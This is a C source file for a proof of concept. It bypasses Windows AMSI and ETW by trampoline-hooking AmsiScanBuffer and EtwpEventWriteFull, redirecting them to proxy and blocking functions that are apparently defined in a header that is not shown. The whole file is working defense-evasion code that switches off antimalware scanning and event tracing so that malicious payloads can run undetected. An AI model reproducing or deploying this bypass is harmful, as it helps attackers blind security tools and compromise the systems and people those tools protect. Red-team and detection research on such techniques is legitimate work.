/*
	
	Author: MochaByte
	Date: 24.06.2025
	Description: PoC AMSI & ETW bypass through trampoline hooking
	
*/

#include <stdio.h>
#include <Windows.h>

#include "functions.h"

//#define DEBUG

int main() 
{

	PVOID	pOriginalEtwFunc	= NULL,
			pEtwpEventWriteFull = NULL,
			pAmsiScanBuff		= NULL;

	DWORD	dwOldProtectAmsi	= 0,
			dwOldProtectEtw		= 0;

	// Loading amsi.dll
	if (!LoadLibrary((TEXT("AMSI"))))
		return -1;

#ifdef DEBUG
	printf("[DBG] Fetching EtwpEventWriteFull..\n");
#endif

	GetEtwpEventWriteFull(&pEtwpEventWriteFull);
	pAmsiScanBuff = GetProcAddress(GetModuleHandle(TEXT("AMSI")), "AmsiScanBuffer");
	if (pAmsiScanBuff == NULL)
	{
		printf("[-] Failed to get AmsiScanBuffer: %d\n", GetLastError());
		return -1;
	}

	printf("[#] Press Enter to continue");
	getchar();

#ifdef DEBUG
	printf("[DBG] Setting up trampoline functions..\n");
#endif
	if (!TrampolineX64(pEtwpEventWriteFull, BlockExecutionFlow, &pOriginalEtwFunc, &dwOldProtectEtw))
		return -1;

	if (!TrampolineX64(pAmsiScanBuff, ProxyAmsi, (PVOID*)&g_pOriginalAmsiFunc, &dwOldProtectAmsi))
		return -1;

#ifdef DEBUG
	printf("[DBG] dwOldProtectEtw value in main.c is: %d\n", dwOldProtectEtw);
	printf("[DBG] dwOldProtectAmsi value in main.c is: %d\n", dwOldProtectAmsi);
	printf("[DBG] EtwpEventWriteFull is now hooked\n");
	printf("[DBG] AmsiScanBuffer is now hooked\n");
#endif

	printf("[+] Successfully hooked ETW & AMSI\n");

	printf("[#] Press Enter to stop");
	getchar();

	return 0;
}